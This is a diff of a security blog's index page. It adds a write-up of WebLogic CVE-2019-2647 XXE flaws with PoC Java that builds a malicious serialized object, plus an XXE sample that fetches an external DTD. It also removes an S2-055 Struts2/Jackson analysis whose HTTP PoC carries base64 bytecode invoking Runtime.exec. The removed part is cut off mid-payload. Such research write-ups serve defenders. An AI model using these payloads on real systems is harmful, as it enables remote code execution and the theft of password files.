@@ -334,6 +334,182 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2019/04/19/weblogic CVE-2019-2647等相关XXE漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2019/04/19/weblogic CVE-2019-2647等相关XXE漏洞分析/" itemprop="url">
+                  weblogic CVE-2019-2647等相关XXE漏洞分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-19T18:41:44+08:00">
+                2019-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/weblogic-xxe/" itemprop="url" rel="index">
+                    <span itemprop="name">weblogic xxe</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/19/weblogic CVE-2019-2647等相关XXE漏洞分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/04/19/weblogic CVE-2019-2647等相关XXE漏洞分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/04/19/weblogic CVE-2019-2647等相关XXE漏洞分析/" class="leancloud_visitors" data-flag-title="weblogic CVE-2019-2647等相关XXE漏洞分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>按照惯例，Oracle发布了4月份的补丁，详情见链接(<a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW" target="_blank" rel="external">https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW</a><br>)一看就是一堆漏洞，高危的还好几个。<br><img src="/images/cve-2019-2647-1.png" alt="0"><br>CVSS 评分为9.8的暂且不分析，我们先来看看wsee模块下的几个XXE漏洞，都是给的7.5的评分，个人觉得这分给的少，毕竟可以泄露weblogic的加密密钥和密码文件，破解之后就可以获取用户名和密码。在这些漏洞中要数@Matthias Kaiser的贡献最大，高危的都是他提交的。</p>
+<h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p>从补丁对比文件来看，在wsee模块下有5个都加了xxe的防护，那我们就从xxe漏洞入手。有一个新增的文件WSATStreamHelper.java,核心代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> weblogic.wsee.wstx.wsat;</div><div class="line"><span class="keyword">import</span> ...</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WSATStreamHelper</span> </span>&#123;</div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Source <span class="title">convert</span><span class="params">(InputStream in)</span> </span>&#123;</div><div class="line">      SAXParserFactory spf = SAXParserFactory.newInstance();</div><div class="line">      SAXSource xmlSource = <span class="keyword">null</span>;</div><div class="line"></div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">         spf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</div><div class="line">         spf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</div><div class="line">         spf.setFeature(<span class="string">"http://xml.org/sax/features/validation"</span>, <span class="keyword">false</span>);</div><div class="line">         spf.setNamespaceAware(<span class="keyword">true</span>);</div><div class="line">         spf.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</div><div class="line">         xmlSource = <span class="keyword">new</span> SAXSource(spf.newSAXParser().getXMLReader(), <span class="keyword">new</span> InputSource(in));</div><div class="line">      &#125; <span class="keyword">catch</span> (Exception var4) &#123;</div><div class="line">         <span class="keyword">if</span> (WSATHelper.isDebugEnabled()) &#123;</div><div class="line">            WSATHelper.getInstance().debug(<span class="string">"Failed to call setFeature in SAXParserFactory. "</span>);</div><div class="line">         &#125;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">return</span> xmlSource;</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>稍微懂点xxe漏洞的人都知道这是xxe的防护代码，这个文件新加到了ForeignRecoveryContext.java和WSATXAResource.java中，就拿<br>ForeignRecoveryContext来入手。其修复后的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</div><div class="line">      klassVersion = in.readInt();</div><div class="line">      <span class="keyword">this</span>.fxid = (Xid)in.readObject();</div><div class="line">      <span class="keyword">this</span>.debug(<span class="string">"ForeignRecoveryContext.readExternal tid:"</span> + <span class="keyword">this</span>.fxid);</div><div class="line">      <span class="keyword">this</span>.version = (Version)in.readObject();</div><div class="line">      <span class="keyword">int</span> len = in.readInt();</div><div class="line">      <span class="keyword">byte</span>[] eprBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[len];</div><div class="line">      in.readFully(eprBytes);</div><div class="line">      <span class="keyword">this</span>.epr = EndpointReference.readFrom(WSATStreamHelper.convert(<span class="keyword">new</span> ByteArrayInputStream(eprBytes)));</div><div class="line">      <span class="keyword">this</span>.debug(<span class="string">"ForeignRecoveryContext.readExternal EndpointReference:"</span> + <span class="keyword">this</span>.epr);</div><div class="line">      ForeignRecoveryContextManager.getInstance().add(<span class="keyword">this</span>);</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>仔细对比下来就是EndpointReference.readFrom(WSATStreamHelper.convert(new ByteArrayInputStream(eprBytes)));WSATStreamHelper.convert是新加的，从前面代码中也可以看到在convert的过程中启用了xxe防护。再一看这个函数还是readExternal，这不就是典型的反序列化漏洞的入口吗？看官看到这就知道payload怎么来了，最典型的就是通过T3协议，如下就是如何构造PoC了。</p>
+<h1 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h1><p>构造PoC还是有些弯路的，最典型的就是为什么拿ForeignRecoveryContext.java入手，其实看官可以尝试些其他漏洞点，构造的时候会遇到一些问题，有些问题不好一时解决所以就转到ForeignRecoveryContext.java。言归正传，详细的构造如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyEndpointReference</span> <span class="keyword">extends</span> <span class="title">EndpointReference</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">writeTo</span><span class="params">(Result result)</span></span>&#123;</div><div class="line">        <span class="keyword">byte</span>[] tmpbytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</div><div class="line">        <span class="keyword">int</span> nRead;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            InputStream is = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"test.xml"</span>));</div><div class="line">            </div><div class="line">            <span class="keyword">while</span>((nRead=is.read(tmpbytes,<span class="number">0</span>,tmpbytes.length)) != -<span class="number">1</span>)&#123;</div><div class="line">                ((StreamResult)result).getOutputStream().write(tmpbytes,<span class="number">0</span>,nRead);</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">(String command)</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> klassVersion = <span class="number">1032</span>;</div><div class="line">Xid xid = <span class="keyword">new</span> weblogic.transaction.internal.XidImpl();</div><div class="line">Version v = Version.DEFAULT;</div><div class="line"><span class="keyword">byte</span>[] tid = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">65</span>&#125;;</div><div class="line"></div><div class="line">weblogic.wsee.wstx.internal.ForeignRecoveryContext frc = <span class="keyword">new</span> weblogic.wsee.wstx.internal.ForeignRecoveryContext();</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">Field f = frc.getClass().getDeclaredField(<span class="string">"fxid"</span>);</div><div class="line">f.setAccessible(<span class="keyword">true</span>);</div><div class="line">f.set(frc,xid);</div><div class="line">Field f1 = frc.getClass().getDeclaredField(<span class="string">"epr"</span>);</div><div class="line">f1.setAccessible(<span class="keyword">true</span>);</div><div class="line">f1.set(frc,(EndpointReference)<span class="keyword">new</span> MyEndpointReference());</div><div class="line">Field f2 = frc.getClass().getDeclaredField(<span class="string">"version"</span>);</div><div class="line">f2.setAccessible(<span class="keyword">true</span>);</div><div class="line">f2.set(frc,v);</div><div class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">e.printStackTrace();</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> frc;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>test.xml的内容可以是任意的xxe的payload：比如说如下，<br>xxe，测试payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE data SYSTEM "http://xxlegend.com/weblogic" [</span></div><div class="line">        &lt;!ELEMENT data (#PCDATA)&gt;</div><div class="line">        ]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>关键点都展示完了，秀一下成果。</p>
+<h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p>可以看到调用栈如下：<br><img src="/images/cve-2019-2647-2.png" alt="2"></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/10/23/Weblogic CVE-2018-3191分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2038,188 +2214,6 @@ class java.lang.ProcessBuilder</code></p>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/06/S2-055漏洞环境搭建与分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/12/06/S2-055漏洞环境搭建与分析/" itemprop="url">
-                  S2-055漏洞环境搭建与分析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-06T22:28:56+08:00">
-                2017-12-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Struts2/" itemprop="url" rel="index">
-                    <span itemprop="name">Struts2</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/12/06/S2-055漏洞环境搭建与分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/12/06/S2-055漏洞环境搭建与分析/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2017/12/06/S2-055漏洞环境搭建与分析/" class="leancloud_visitors" data-flag-title="S2-055漏洞环境搭建与分析">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="1-综述"><a href="#1-综述" class="headerlink" title="1 综述"></a>1 综述</h1><p>2017年12月1日，Apache Struts发布最新的安全公告，Apache Struts 2.5.x REST插件存在远程代码执行的中危漏洞，漏洞编号与CVE-2017-7525相关。漏洞的成因是由于使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。当然官方说的影响是未知，其实这里是远程代码执行。<br>相关链接如下：<br><a href="https://cwiki.apache.org/confluence/display/WW/S2-055" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-055</a><br>影响版本：<br> Struts 2.5 - Struts 2.5.14<br>规避方案<br>立即升级到Struts 2.5.14.1或者升级com.fasterxml.jackson到2.9.2版本</p>
-<h1 id="2-技术分析"><a href="#2-技术分析" class="headerlink" title="2 技术分析"></a>2 技术分析</h1><p>从官方的描述来看，这个就是Jackson的反序列化漏洞，由于Jackson在处理反序列的时候需要支持多态，所以在反序列的时候通过指定特定的类来达到实现多态的目的。这个特性默认是不开启的，所以在Struts2中影响也是有限。</p>
-<h2 id="2-1-Jackson多态类型绑定"><a href="#2-1-Jackson多态类型绑定" class="headerlink" title="2.1 Jackson多态类型绑定"></a>2.1 Jackson多态类型绑定</h2><p>为了让Jackson支持多态，Jackson官方提供了几种方式，下面介绍两种常用方式（<a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization）" target="_blank" rel="external">https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization）</a><br>第一种：全局Default Typing机制，启用代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">objectMapper.enableDefaultTyping(); <span class="comment">// default to using DefaultTyping.OBJECT_AND_NON_CONCRETE</span></div><div class="line">objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</div></pre></td></tr></table></figure></p>
-<p>这是一个全局开关，打开之后，在持久化存储数据时会存储准确的类型信息。</p>
-<p>第二种：为相应的class添加@JsonTypeInfo注解<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> ObjectMapper <span class="title">enableDefaultTyping</span><span class="params">(DefaultTyping dti)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> enableDefaultTyping(dti, JsonTypeInfo.As.WRAPPER_ARRAY);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>通过阅读源码也能发现，全局Default Typing机制也是通过JsonTypeInfo来实现的。下面来看一个简单的示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123; &#125;  在超类Animal上加上一段<span class="meta">@JsonTypeInfo</span>，所有Animal的子类反序列化都可以准确的对于子类型。</div></pre></td></tr></table></figure></p>
-<p>这段注解什么意思呢？JsonTypeInfo.Id.CLASS是指序列化或者反序列时都是全名称，如<code>org.codehaus.jackson.sample.Animal</code>,<code>JsonTypeInfo.As.WRAPPER_ARRAY</code> 意为使用数组表示，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[</div><div class="line">    &quot;com.fasterxml.beans.EmployeeImpl&quot;,</div><div class="line">    &#123;</div><div class="line">       ... // actual instance data without any metadata properties</div><div class="line">    &#125;</div><div class="line">]</div></pre></td></tr></table></figure></p>
-<h2 id="2-2-S2-055-环境搭建"><a href="#2-2-S2-055-环境搭建" class="headerlink" title="2.2 S2-055 环境搭建"></a>2.2 S2-055 环境搭建</h2><p>了解了Jackson的相关多态的特性之后，为了触发反序列化漏洞，必须开启这个特性，再来看看Struts2的相关代码。由于Jackson不是Struts2 json格式的默认处理句柄，首先修改struts.xml,添加如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">type</span>=<span class="string">"org.apache.struts2.rest.handler.ContentTypeHandler"</span> <span class="attr">name</span>=<span class="string">"jackson"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.rest.handler.JacksonLibHandler"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.rest.handlerOverride.json"</span> <span class="attr">value</span>=<span class="string">"jackson"</span>/&gt;</span></div></pre></td></tr></table></figure></p>
-<p>这样Content-Type为application/json格式的请求都交给了JcaksonLibHandler来处理，再来分析下JacksonLibHandler的代码，如下所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toObject</span><span class="params">(Reader in, Object target)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        mapper.configure(SerializationFeature.WRITE_NULL_MAP_VALUES, <span class="keyword">false</span>);</div><div class="line">        ObjectReader or = mapper.readerForUpdating(target);</div><div class="line">        or.readValue(in);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
-<p>上述代码是处理json反序列的逻辑，很显然没有启用全局Default Typing机制，那么为了触发这个漏洞只能是通过第二种支持多态的方式来打开这个特性。这个漏洞和S2-052非常类似，都是引用的第三方库存在缺陷导致的漏洞，这样的案例数不胜数，在Java生态中简直就是一个灾难，第三方依赖实在太多。为了分析这个漏洞，我们还是拿052的环境来做测试，也就是rest-show-case，环境搭建可以参考<a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/，具体的修改如下：">http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/，具体的修改如下：</a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Order</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> String id;</div><div class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)</div><div class="line">    <span class="keyword">public</span> Object clientName;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span> amount;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Order</span><span class="params">()</span> </span>&#123;&#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Order</span><span class="params">(String id, Object clientName, <span class="keyword">int</span> amount)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">this</span>.id = id;</div><div class="line">        <span class="keyword">this</span>.clientName = clientName;</div><div class="line">        <span class="keyword">this</span>.amount = amount;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setClientName</span><span class="params">(Object clientName)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.clientName = clientName;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
-<p>修改部分主要在<code>@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)
-    public Object clientName;</code> 一个在clientName上方添加注解，打开支持多态的特性，这样我们就能指定clientName的类型；另一个是将clientName的类型改为Object类型，这样就避免了类型不匹配或者不是其子类的错误。相应地修改setClientName方法的传入类型为Object。</p>
-<h2 id="2-3-PoC构造"><a href="#2-3-PoC构造" class="headerlink" title="2.3 PoC构造"></a>2.3 PoC构造</h2><p>Jackson已经暴露了很多种PoC在外，下面我们拿com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl来做示例，具体的PoC如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /orders HTTP/1.1</div><div class="line">Host: 192.168.3.103:8080</div><div class="line">Proxy-Connection: keep-alive</div><div class="line">Content-Length: 2157</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://192.168.3.103:8080</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/json</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://192.168.3.103:8080/orders/new</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6</div><div class="line">Cookie: csrftoken=LYokAxo4ABMl0wKhLhkdl1x5I0AQQDE8E3L1zcc3A1YVybHMEHkOWq01VqdnfJEm; JSESSIONID=7367044F7C24B8BE7CDE5444E28E2BF4</div><div class="line"></div><div class="line">&#123;&quot;clientName&quot;:[&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&#123;&quot;transletBytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1McGVyc29uL1Rlc3Q7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACAAJBwAvDAAwADEBAARjYWxjDAAyADMBAAtwZXJzb24vVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAPAAQAEAAN